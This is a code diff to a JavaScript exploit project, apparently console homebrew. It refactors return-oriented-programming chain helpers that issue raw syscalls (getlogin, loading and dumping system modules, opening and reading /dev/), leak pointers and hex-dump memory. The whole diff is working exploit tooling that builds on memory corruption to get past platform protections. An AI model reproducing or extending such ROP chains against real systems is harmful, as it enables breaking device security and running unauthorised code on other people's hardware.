@@ -32,13 +32,13 @@ function getpid() {
 function getlogin() {
 	var chain = new rop();
 	
-	chain.syscall("getlogin", 49, stack_base + return_va + 0x480, 17);
+	chain.syscall("getlogin", 49, chain.data, 17);
 	
 	chain.execute();
 	
 	setTimeout(function() {
-		var name = readString(stack_base + return_va + 0x480);
-		var pointer = getU32from(stack_base + return_va + 0x480 + 8);
+		var name = readString(chain.data);
+		var pointer = getU32from(chain.data + 8);
 		
 		logAdd("Name: " + name);
 		logAdd("Leaked pointer: 0x" + pointer.toString(16));
@@ -46,11 +46,10 @@ function getlogin() {
 }
 
 function getLoadedModules() {
-	var data = stack_base + return_va + 0x480;
-	var countAddress = data;
-	var modulesAddress = data + 8;
-	
 	var chain = new rop();
+	
+	var countAddress = chain.data;
+	var modulesAddress = chain.data + 8;
 	
 	chain.syscall("getLoadedModules", 592, modulesAddress, 256, countAddress);
 	chain.write_rax_ToVariable(0);
@@ -78,7 +77,7 @@ function dumpModule() {
 	
 	var chain = new rop();
 	
-	var moduleInfoAddress = stack_base + return_va + 0x480;
+	var moduleInfoAddress = chain.data;
 	setU64to(moduleInfoAddress, 0x160);
 	
 	chain.syscall("getModuleInfo", 0, 593, moduleNumber, moduleInfoAddress);
@@ -111,7 +110,7 @@ function loadDumpModule() {
 	
 	var chain = new rop();
 	
-	var moduleInfoAddress = stack_base + return_va + 0x480;
+	var moduleInfoAddress = chain.data;
 	setU64to(moduleInfoAddress, 0x160);
 	
 	chain.call("loadModule", libSysmodule, 0x1850, moduleNumber, 0, 0, 0);
@@ -137,17 +136,20 @@ function loadDumpModule() {
 function openDev() {
 	var chain = new rop();
 	
-	writeString(stack_base + return_va + 0x480, "/dev/");
-	chain.syscall("open", 5, stack_base + return_va + 0x480, 0, 0);
+	var directory = chain.data;
+	var contents = chain.data;
+	
+	writeString(directory, "/dev/");
+	chain.syscall("open", 5, directory, 0, 0);
 	chain.write_rax_ToVariable(0);
 	
 	chain.read_rdi_FromVariable(0);
-	chain.syscall("read", 3, undefined, stack_base + return_va + 0x480, 1028);
+	chain.syscall("read", 3, undefined, contents, 1028);
 	
 	chain.execute();
 	
 	setTimeout(function() {
-		logAdd(hexDump(stack_base + return_va + 0x480, 256));
+		logAdd(hexDump(contents, 256));
 	}, 1);
 }
 
